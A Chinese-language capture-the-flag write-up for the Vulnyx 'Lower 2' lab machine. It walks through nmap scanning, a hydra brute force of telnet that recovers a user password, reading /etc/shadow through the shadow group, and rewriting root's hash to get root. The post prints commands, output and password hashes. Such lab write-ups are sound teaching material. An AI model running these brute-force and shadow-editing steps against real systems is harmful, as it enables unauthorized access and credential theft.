---
title: Vulnyx-Lower 2
published: 2025-03-09 16:18:04
tags: [Vulnyx]
category: 靶机
draft: false
---

# Lower 2

> Difficulty: **LOW**
> 

## 前期踩点

`nmap`扫描，`30`是靶机

```bash
⚡ root@kali  ~/Desktop/test/test  nmap -sP 192.168.56.0/24 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-16 10:54 EST
Nmap scan report for 192.168.56.1
Host is up (0.00026s latency).
MAC Address: 0A:00:27:00:00:09 (Unknown)
Nmap scan report for 192.168.56.2
Host is up (0.00030s latency).
MAC Address: 08:00:27:27:88:A1 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.30
Host is up (0.00055s latency).
MAC Address: 08:00:27:49:53:EF (Oracle VirtualBox virtual NIC)
```

```bash
⚡ root@kali  ~/Desktop/test/test  nmap -sT -min-rate 10000 -p- 192.168.56.30  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-16 10:55 EST
Nmap scan report for 192.168.56.30
Host is up (0.00080s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
23/tcp open  telnet
80/tcp open  http
MAC Address: 08:00:27:49:53:EF (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 17.34 seconds
```

```bash
 root@kali  ~/Desktop/test/test  nmap -sT -A -T4 -O -p 22,23,80 192.168.56.30 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-16 10:57 EST
Nmap scan report for 192.168.56.30
Host is up (0.00056s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)
| ssh-hostkey: 
|   256 a9:a8:52:f3:cd:ec:0d:5b:5f:f3:af:5b:3c:db:76:b6 (ECDSA)
|_  256 73:f5:8e:44:0c:b9:0a:e0:e7:31:0c:04:ac:7e:ff:fd (ED25519)
23/tcp open  telnet  Netkit telnet-ssl telnetd
80/tcp open  http    nginx 1.22.1
|_http-server-header: nginx/1.22.1
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:49:53:EF (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.56 ms 192.168.56.30

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.20 seconds
```

```bash
 ⚡ root@kali  ~/Desktop/test/test  nmap -script=vuln -p 22,23,80 192.168.56.30 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-16 11:03 EST
Nmap scan report for 192.168.56.30
Host is up (0.00097s latency).

PORT   STATE SERVICE
22/tcp open  ssh
23/tcp open  telnet
80/tcp open  http
| http-vuln-cve2011-3192: 
|   VULNERABLE:
|   Apache byterange filter DoS
|     State: VULNERABLE
|     IDs:  BID:49303  CVE:CVE-2011-3192
|       The Apache web server is vulnerable to a denial of service attack when numerous
|       overlapping byte ranges are requested.
|     Disclosure date: 2011-08-19
|     References:
|       https://seclists.org/fulldisclosure/2011/Aug/175
|       https://www.tenable.com/plugins/nessus/55976
|       https://www.securityfocus.com/bid/49303
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
MAC Address: 08:00:27:49:53:EF (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 88.38 seconds
```

优先级`80` > `23` , `22`

访问`http`服务

![image.png](image%2015.png)

扫描目录，啥也没有发现

```bash
⚡ root@kali  ~/Desktop/test/test  gobuster dir -u 192.168.56.30 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,zip,txt,html -b 403,302,404,502           
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.30
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404,502,403,302
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,zip,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Progress: 1038215 / 1038220 (100.00%)
===============================================================
Finished
===============================================================
```

`http`服务器应该是混淆的，接下来试试`SSH`

## SSH

随便输入个用户名，查看是否存在`banner`信息

```bash
⚡ root@kali  ~/Desktop/test/test  ssh ssh@192.168.56.30    
The authenticity of host '192.168.56.30 (192.168.56.30)' can't be established.
ED25519 key fingerprint is SHA256:4K6G5c0oerBJXgd6BnT2Q3J+i/dOR4+6rQZf20TIk/U.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:22: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.30' (ED25519) to the list of known hosts.

###################################################
### Welcome to Brian Taylor's (b.taylor) server ###
###################################################

ssh@192.168.56.30: Permission denied (publickey).
```

存在，`Brian` `Taylor` `b.taylor` 可能就是用户名，但是`SSH`只允许使用私钥登录

## brute telnet

那么我们只能爆破`telnet`

```bash
⚡ root@kali  ~/Desktop/test/test  hydra -l b.taylor -P /usr/share/wordlists/rockyou.txt -Vv 192.168.56.30 telnet
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-16 11:19:08
[WARNING] telnet is by its nature unreliable to analyze, if possible better choose FTP, SSH, etc. if available
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking telnet://192.168.56.30:23/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[ATTEMPT] target 192.168.56.30 - login "b.taylor" - pass "123456" - 1 of 14344399 [child 0] (0/0)
[ATTEMPT] target 192.168.56.30 - login "b.taylor" - pass "12345" - 2 of 14344399 [child 1] (0/0)
[ATTEMPT] target 192.168.56.30 - login "b.taylor" - pass "123456789" - 3 of 14344399 [child 2] (0/0)
[ATTEMPT] target 192.168.56.30 - login "b.taylor" - pass "password" - 4 of 14344399 [child 3] (0/0)
[ATTEMPT] target 192.168.56.30 - login "b.taylor" - pass "iloveyou" - 5 of 14344399 [child 4] (0/0)
[ATTEMPT] target 192.168.56.30 - login "b.taylor" - pass "princess" - 6 of 14344399 [child 5] (0/0)
[ATTEMPT] target 192.168.56.30 - login "b.taylor" - pass "1234567" - 7 of 14344399 [child 6] (0/0)
[ATTEMPT] target 192.168.56.30 - login "b.taylor" - pass "rockyou" - 8 of 14344399 [child 7] (0/0)
[ATTEMPT] target 192.168.56.30 - login "b.taylor" - pass "12345678" - 9 of 14344399 [child 8] (0/0)
[ATTEMPT] target 192.168.56.30 - login "b.taylor" - pass "abc123" - 10 of 14344399 [child 9] (0/0)
[ATTEMPT] target 192.168.56.30 - login "b.taylor" - pass "nicole" - 11 of 14344399 [child 10] (0/0)
[ATTEMPT] target 192.168.56.30 - login "b.taylor" - pass "daniel" - 12 of 14344399 [child 11] (0/0)
[ATTEMPT] target 192.168.56.30 - login "b.taylor" - pass "babygirl" - 13 of 14344399 [child 12] (0/0)
[ATTEMPT] target 192.168.56.30 - login "b.taylor" - pass "monkey" - 14 of 14344399 [child 13] (0/0)
[ATTEMPT] target 192.168.56.30 - login "b.taylor" - pass "lovely" - 15 of 14344399 [child 14] (0/0)
[ATTEMPT] target 192.168.56.30 - login "b.taylor" - pass "jessica" - 16 of 14344399 [child 15] (0/0)
[23][telnet] host: 192.168.56.30   login: b.taylor   password: rockyou
[STATUS] attack finished for 192.168.56.30 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-16 11:19:17
```

很快啊，一下就出来了，账户是`b.taylor`密码是`rockyou`

## 提权

登录`telnet` ，进来后就能发现`UserFlag`

```bash
⚡ root@kali  ~/Desktop/test/test  telnet 192.168.56.30 
Trying 192.168.56.30...
Connected to 192.168.56.30.
Escape character is '^]'.

lower2 login: b.taylor
Password: 
Last login: Sun Feb 16 17:19:12 CET 2025 on pts/14
b.taylor@lower2:~$ ls
user.txt
b.taylor@lower2:~$ cat user.txt
edc9f5c55af87505033a20dd41931364
b.taylor@lower2:~$ 
```

查看权限，发现拥有`shadow`权限，可以查看`shadow`文件

```bash
b.taylor@lower2:~$ id
uid=1000(b.taylor) gid=1000(b.taylor) grupos=1000(b.taylor),42(shadow)
```

```bash
b.taylor@lower2:~$ cat /etc/shadow
root:$y$j9T$RDW/7EgA4sElvqxLVk.Uo.$OmF5Lm4Ub/UeC2ua6tTQnHB07WKpYs1lOXl.lS581q8:20134:0:99999:7:::
daemon:*:19676:0:99999:7:::
bin:*:19676:0:99999:7:::
sys:*:19676:0:99999:7:::
sync:*:19676:0:99999:7:::
games:*:19676:0:99999:7:::
man:*:19676:0:99999:7:::
lp:*:19676:0:99999:7:::
mail:*:19676:0:99999:7:::
news:*:19676:0:99999:7:::
uucp:*:19676:0:99999:7:::
proxy:*:19676:0:99999:7:::
www-data:*:19676:0:99999:7:::
backup:*:19676:0:99999:7:::
list:*:19676:0:99999:7:::
irc:*:19676:0:99999:7:::
_apt:*:19676:0:99999:7:::
nobody:*:19676:0:99999:7:::
systemd-network:!*:19676::::::
messagebus:!:19676::::::
sshd:!:19676::::::
b.taylor:$y$j9T$du9sW7McN8WfjLKPRheP7/$pyE/4IrgDjurpaNzpdyxj8PYcOYyDksyYPG2rxEBxm4:20135:0:99999:7:::
telnetd-ssl:!:20134::::::
```

然后查看自己`Kali`的`/etc/shadow`文件，将自己的密码复制

然后在靶机使用`nano`修改`shadow`文件，将`root`的密码改成你的密码，最后切换用户

```bash
⚡ root@kali  ~/Desktop/test/Lower2  telnet 192.168.56.30
Trying 192.168.56.30...
Connected to 192.168.56.30.
Escape character is '^]'.

lower2 login: root
Password: 
root@lower2:~# id
uid=0(root) gid=0(root) grupos=0(root)
root@lower2:~# cat root.txt 
235aa90b688b711a87d5d15c6e34dada
```